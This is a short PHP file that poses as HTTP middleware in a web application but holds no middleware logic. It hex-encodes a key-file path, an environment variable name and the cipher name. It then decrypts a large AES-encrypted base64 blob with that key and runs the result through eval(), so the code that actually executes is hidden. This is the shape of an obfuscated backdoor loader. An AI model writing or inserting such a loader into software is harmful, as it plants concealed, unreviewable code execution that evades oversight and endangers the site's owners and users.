<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('E3dTU3QfNuhjE30ntOwLNw==');

$c=base64_decode(

'8bM+2wWaQ04uOyIz/xlYTvcbEJoK6bLznc4Sjpkvyk2y8sTNlgfp8xVmZK4PSccP52PT+E5mxhfy' .
'ghyZKGWnGbi8L2PylreauIYuf7Dz2p5cGtkq+7HycRhV0Y5/AFaPHUjuig44GVqUL0nWNuHeAIXK' .
'7nm1EZyF1VSDPg0mWCTVHdwQ8edP6e5vk4Ch7ted+aKARnhBLSRXn6gZSve2eD5hWA84Ec9u2dzz' .
'dDvjiRgrLxPN4jfWqg6CUN9UBGtob6APeCZPzQQ5+Hhrja9sC/bv2sztzgcYXfsvoViCnn2Bu9UN' .
'sXkgMp0acGZ6XYnDjGJm++wpTL/VXgMQGWmkBumkfx672mSAIHQuToVNgkQVw1vBM96MO2artXR0' .
'IAvtKTNqngUdCo1G/ZBtzE/BBTMyavsWyvDN/PW7Bf1Kck4GSiToQDKiRdC+mVUGP7sFCrb9cEdk' .
'CgbwWvMbxCmY4AX4QALCqxFSLoUZYGOS8GWp8TE1ILDVoA4yGqlMNDnFZz51qbOlg2NFahkzH4CF' .
'Ta6oYTwOyxd/B4lJkq2i7LXmzQPCK3ZWzEggQHXIHgHKBZMeZ97xoIMPTXsyUT4EnN2tS/H/R2FG' .
'WcM5xi9CjRu/NkvTV7RFwtyI5IU5chdll1zVtx/Aqac2LDbx4L31pT+pvaLPtbV5Z0v8kHv6UK64' .
'idUTsfwkPZdIMAArQIj3495mIckf1kISW247a/vbKDLYqHPSTTsQ1X24rsvKiQ23JJO1nif+suAf' .
'uixU6sWa0QYqjaNtIbAnnubx9qlg7g0OnDT4rM/705Esoxj7+DYta0Q1nthJH6An8tNwY8q37EEt' .
'aoMI96XprZcnbocu3L/ZsqKrrZrT3Mk9SwprMYmNVw7vNiba7MbUYUH2/8lDyGQrJHM99CF82aht' .
'RrGHZePljoO5sP/eiZgoRQVzbWkuuSl7E2Ayi0rkECY237YcWcYSjCbYNLARlr7wydgfg7QiS0Lu' .
'rGz7yiztvFWoQCpSKwNKCuN1ANjDyR4lm3iLcPBHPPgjRBT4ITAXwTZtkC9FkPncfJei/OoFCC6J' .
'QmoPeSdV4woOJsl0Z9Yiwcd17iM2qhmdrLu1iGO6FyTRgrYnvd8ZhxhPrtaGfMtyAN3+qwxCCm1s' .
'NLD1a9uzlDzlGDUZhqTZFyhGrOnKfezqfswn0rUVITWUmExQy5MczodJEnX3YHga13RL/nckLQUF' .
'al6u+Ga+z6s7zFCAY7hT9KE/3LNx1dYO7Bp9WQk7eDfWq5JirH/QSUUguiTDk4ZbFSrCDuQQ9NR4' .
'OwpWzedVrBmsxvTgYGqFuCFG22roXO0cikrUvEfllHe+QOjHKxeoJhchETYEQNpF4kkaapr7ekN3' .
'KumI1Fu0jIeAWzOAvH/rDl1QRm0W+/1YApxbYokmX58BdSdWC+goaf6jUwxkJd8qrc8uz3WkGFLR' .
'xi0OKt13opdiGYchM3fhIpMe11TJ/fX7QfhwcxXyWeoLI/uJGsDy/s7eczrOH168NkSWg0m0biKf' .
'R/xmfr19u+xERbzDNHrcQlcdTzF+15oGCAj4Dg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

